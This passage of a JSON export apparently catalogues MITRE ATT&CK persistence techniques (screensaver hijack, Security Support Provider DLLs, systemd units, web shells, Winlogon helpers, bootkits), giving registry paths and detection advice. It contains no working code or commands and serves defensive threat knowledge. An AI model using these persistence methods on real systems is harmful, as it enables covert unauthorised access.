path<\/li>\n<li><code>ScreenSaveActive<\/code> - set to '1' to enable the screensaver<\/li>\n<li><code>ScreenSaverIsSecure<\/code> - set to '0' to not require a password to unlock<\/li>\n<li><code>ScreenSaveTimeout<\/code> - sets user inactivity timeout before screensaver is executed<\/li>\n<\/ul>\n<p>Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":351,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":354,"name":"T1101 - Security Support Provider","sort_id":0,"external_id":"T1101","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<\/code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<\/code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n(Citation: Graeber 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":354,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":356,"name":"T1505 - Server Software Component","sort_id":0,"external_id":"T1505","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":356,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":356,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":356,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":358,"name":"T1058 - Service Registry Permissions Weakness","sort_id":0,"external_id":"T1058","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services<\/code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a>, or <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)<\/p>\n<p>If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath\/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and\/or privilege escalation to the account context the service is set to execute under (local\/domain account, SYSTEM, LocalService, or NetworkService).<\/p>\n<p>Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand<\/code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":358,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":362,"name":"T1023 - Shortcut Modification","sort_id":0,"external_id":"T1023","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":362,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":375,"name":"T1165 - Startup Items","sort_id":0,"external_id":"T1165","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>\/Library\/StartupItems<\/code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist<\/code>, reside in the top-level directory. <\/p>\n<p>An adversary can create the appropriate folders\/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":375,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":382,"name":"T1019 - System Firmware","sort_id":0,"external_id":"T1019","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>The BIOS (Basic Input\/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)<\/p>\n<p>System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":382,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":390,"name":"T1501 - Systemd Service","sort_id":0,"external_id":"T1501","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.<\/p>\n<p>Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>\/etc\/systemd\/system<\/code> and <code>\/usr\/lib\/systemd\/system<\/code> directories and have the file extension <code>.service<\/code>. Each service unit file may contain numerous directives that can execute system commands. <\/p>\n<ul>\n<li>ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. <\/li>\n<li>ExecReload directive covers when a service restarts. <\/li>\n<li>ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.<\/li>\n<\/ul>\n<p>Adversaries have used systemd functionality to establish persistent access to victim systems by creating and\/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)<\/p>\n<p>While adversaries typically require root privileges to create\/modify service unit files in the <code>\/etc\/systemd\/system<\/code> and <code>\/usr\/lib\/systemd\/system<\/code> directories, low privilege users can create\/modify service unit files in directories such as <code>~\/.config\/systemd\/user\/<\/code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":390,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":394,"name":"T1209 - Time Providers","sort_id":0,"external_id":"T1209","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware\/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)<\/p>\n<p>Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\<\/code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and\/or whenever parameters are changed. (Citation: Microsoft TimeProvider)<\/p>\n<p>Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":394,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":410,"name":"T1100 - Web Shell","sort_id":0,"external_id":"T1100","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)<\/p>\n<p>Web shells may serve as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1108\">Redundant Access<\/a> or as a persistence mechanism in case an adversary's primary access methods are detected and removed.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":410,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":410,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":410,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":413,"name":"T1084 - Windows Management Instrumentation Event Subscription","sort_id":0,"external_id":"T1084","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":413,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":415,"name":"T1004 - Winlogon Helper DLL","sort_id":0,"external_id":"T1004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Winlogon.exe is a Windows component responsible for actions at logon\/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\<\/code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\<\/code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) <\/p>\n<p>Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and\/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)<\/p>\n<ul>\n<li>Winlogon\\Notify - points to notification package DLLs that handle Winlogon events<\/li>\n<li>Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on<\/li>\n<li>Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on<\/li>\n<\/ul>\n<p>Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":415,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":417,"name":"T1401 - Abuse Device Administrator Access to Prevent Removal","sort_id":0,"external_id":"T1401","external_sub_id":null,"old_external_id":"MOB-T1004","old_external_sub_id":null,"tactic_id":26,"description":"<p>A malicious application can request Device Administrator privileges. If the user grants the privileges, the application can take steps to make its removal more difficult.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The device user can view a list of apps with Device Administrator privilege in the device settings.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":417,"platform_id":10,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":426,"name":"T1402 - Broadcast Receivers","sort_id":0,"external_id":"T1402","external_sub_id":null,"old_external_id":"MOB-T1005","old_external_sub_id":null,"tactic_id":26,"description":"<p>An intent is a message passed between Android application or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.<\/p>\n<p>Further, malicious applications can register for intents broadcasted by other applications in addition to the Android system itself. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.<\/p>\n<p>In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.(Citation: Android Changes to System Broadcasts)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Broadcast intent receivers are part of standard OS-level APIs and are therefore typically undetectable to the end user.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":426,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":468,"name":"T1403 - Modify Cached Executable Code","sort_id":0,"external_id":"T1403","external_sub_id":null,"old_external_id":"MOB-T1006","old_external_sub_id":null,"tactic_id":26,"description":"<p>ART (the Android Runtime) compiles optimized code on the device itself to improve performance. An adversary may be able to use escalated privileges to modify the cached code in order to hide malicious behavior. Since the code is compiled on the device, it may not receive the same level of integrity checks that are provided to code running in the system partition.(Citation: Sabanal-ART)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Modifications to cached executable code can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":468,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":499,"name":"T1098.003 - Add Office 365 Global Administrator Role","sort_id":0,"external_id":"T1098.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.(Citation: Microsoft O365 Admin Roles) <\/p>\n<p>This account modification may immediately follow <a href=\"https:\/\/attack.mitre.org\/techniques\/T1136\">Create Account<\/a> or other malicious account activity.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect usage logs from cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. ","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":499,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":500,"name":"T1137.006 - Add-ins","sort_id":0,"external_id":"T1137.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word\/Excel add-in Libraries (WLL\/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)<\/p>\n<p>Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":500,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":500,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":501,"name":"T1098.001 - Additional Azure Service Principal Credentials","sort_id":0,"external_id":"T1098.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may add adversary-controlled credentials for Azure Service Principals in addition to existing legitimate credentials(Citation: Create Azure Service Principal) to maintain persistent access to victim Azure accounts.(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) Azure Service Principals support both password and certificate credentials.(Citation: Why AAD Service Principals) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> modules.(Citation: Demystifying Azure AD Service Principals)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor Azure Activity Logs for service principal modifications.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","platforms":[{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":501,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":501,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":517,"name":"T1547.002 - Authentication Package","sort_id":0,"external_id":"T1547.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)<\/p>\n<p>Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\<\/code> with the key value of <code>&quot;Authentication Packages&quot;=&lt;target binary&gt;<\/code>. The binary will then be executed by the system when the authentication packages are loaded.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe<\/code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":517,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":521,"name":"T1547 - Boot or Logon Autostart Execution","sort_id":0,"external_id":"T1547","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)\u00a0 These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.<\/p>\n<p>Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":521,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":521,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":521,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":522,"name":"T1542.003 - Bootkit","sort_id":0,"external_id":"T1542.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.<\/p>\n<p>A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 